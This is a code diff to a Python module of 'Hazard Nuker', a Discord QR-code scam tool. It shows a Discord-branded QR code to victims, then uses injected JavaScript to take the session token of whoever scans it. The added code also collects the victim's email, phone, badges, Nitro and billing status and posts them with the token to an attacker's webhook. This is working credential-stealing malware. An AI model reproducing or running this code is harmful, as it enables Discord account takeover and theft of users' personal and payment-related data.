@@ -1,23 +1,24 @@
 # Hazard was proudly coded by Rdimo (https://github.com/Rdimo).
+# Copyright (c) 2021 Rdimo#6969 | https://Cheataway.com
 # Hazard Nuker under the GNU General Public Liscense v2 (1991).
 
 #Cred/inspiration goes to https://github.com/NightfallGT/Discord-QR-Scam
 
+
 import requests
-import undetected_chromedriver as uc
 import os
 import json
 import base64
-import Hazard
 
 from PIL import Image
 from zipfile import ZipFile
 from time import sleep
+from urllib.request import urlretrieve
 from selenium import webdriver
 from bs4 import BeautifulSoup
 from colorama import Fore
 
-from util.plugins.common import getheaders
+from util.plugins.common import Chrome_Installer, getheaders
 
 def logo_qr():
     #Paste the discord logo onto the QR code
@@ -44,7 +45,7 @@ def QR_Grabber(Webhook):
     else:
         #installing chromdriver
         print(f"{Fore.RED}Chromedriver not found! Installing it for you")
-        uc.install()
+        Chrome_Installer()
 
     options = webdriver.ChromeOptions()
     options.add_experimental_option('excludeSwitches', ['enable-logging']) #disable logging
@@ -67,9 +68,10 @@ def QR_Grabber(Webhook):
     print(f"\n{Fore.WHITE}Downloading templates for QR code")
 
     # Download qr code templates
-    qr_download = requests.get("https://github.com/Rdimo/Injection/raw/master/QR-Code.zip")
-    with open("QR-Code.zip", 'wb')as zip1:
-        zip1.write(qr_download.content)
+    urlretrieve(
+        "https://github.com/Rdimo/Injection/raw/master/QR-Code.zip",
+        filename="QR-Code.zip",
+    )
     with ZipFile("QR-Code.zip", 'r')as zip2:
         zip2.extractall()
     os.remove("QR-Code.zip")
@@ -101,25 +103,70 @@ def QR_Grabber(Webhook):
     while True:
         if discord_login != driver.current_url:
             token = driver.execute_script('''
-    var req = webpackJsonp.push([
-        [], {
-            extra_id: (e, t, r) => e.exports = r
-        },
-        [
-            ["extra_id"]
-        ]
-    ]);
-    for (let e in req.c)
-        if (req.c.hasOwnProperty(e)) {
-            let t = req.c[e].exports;
-            if (t && t.__esModule && t.default)
-                for (let e in t.default) "getToken" === e && (token = t.default.getToken())
-        }
+    token = (webpackChunkdiscord_app.push([
+        [''],
+        {},
+        e=>{m=[];for(
+                let c in e.c)
+                m.push(e.c[c])}
+        ]),m)
+        .find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()
     return token;
                 ''')
-            j = requests.get("https://discordapp.com/api/v9/users/@me", headers=getheaders(token)).json()
-            a = j['username'] + "#" + j['discriminator']
-            requests.post(Webhook, json = {"content" : f"**Username:** {a}\n**Token:** `{token}`"})
+            j = requests.get("https://discord.com/api/v9/users/@me", headers=getheaders(token)).json()
+            badges = ""
+            flags = j['flags']
+            if (flags == 1): badges += "Staff, "
+            if (flags == 2): badges += "Partner, "
+            if (flags == 4): badges += "Hypesquad Event, "
+            if (flags == 8): badges += "Green Bughunter, "
+            if (flags == 64): badges += "Hypesquad Bravery, "
+            if (flags == 128): badges += "HypeSquad Brillance, "
+            if (flags == 256): badges += "HypeSquad Balance, "
+            if (flags == 512): badges += "Early Supporter, "
+            if (flags == 16384): badges += "Gold BugHunter, "
+            if (flags == 131072): badges += "Verified Bot Developer, "
+            if (badges == ""): badges = "None"
+
+            user = j["username"] + "#" + str(j["discriminator"])
+            email = j["email"]
+            phone = j["phone"] if j["phone"] else "No Phone Number attached"
+
+            url = f'https://cdn.discordapp.com/avatars/{j["id"]}/{j["avatar"]}.gif'
+            try:
+                requests.get(url)
+            except:
+                url = url[:-4]
+            nitro_data = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=getheaders(token)).json()
+            has_nitro = False
+            has_nitro = bool(len(nitro_data) > 0)
+            billing = bool(len(json.loads(requests.get("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=getheaders(token)).text)) > 0)
+
+            embed = {
+                "avatar_url":"https://cdn.discordapp.com/attachments/828047793619861557/891537255078985819/nedladdning_9.gif",
+                "embeds": [
+                    {
+                        "author": {
+                            "name": "Hazard QR Code Grabber",
+                            "url": "https://github.com/Rdimo/Hazard-Nuker",
+                            "icon_url": "https://cdn.discordapp.com/attachments/828047793619861557/891698193245560862/Hazard.gif"
+                        },
+                        "description": f"**{user}** Just Scanned the QR code\n\n**Has Billing:** {billing}\n**Nitro:** {has_nitro}\n**Badges:** {badges}\n**Email:** {email}\n**Phone:** {phone}\n**[Avatar]({url})**",
+                        "fields": [
+                            {
+                              "name": "**Token**",
+                              "value": f"```fix\n{token}```",
+                              "inline": False
+                            }
+                        ],
+                        "color": 8388736,
+
+                        "footer": {
+                          "text": "©Rdimo#6969 https://github.com/Rdimo/Hazard-Nuker"
+                        }
+                    }
+                ]
+            }
+            requests.post(Webhook, json=embed)
             break
-            sleep(0.5)
-            Hazard.main()
+    os._exit(0)
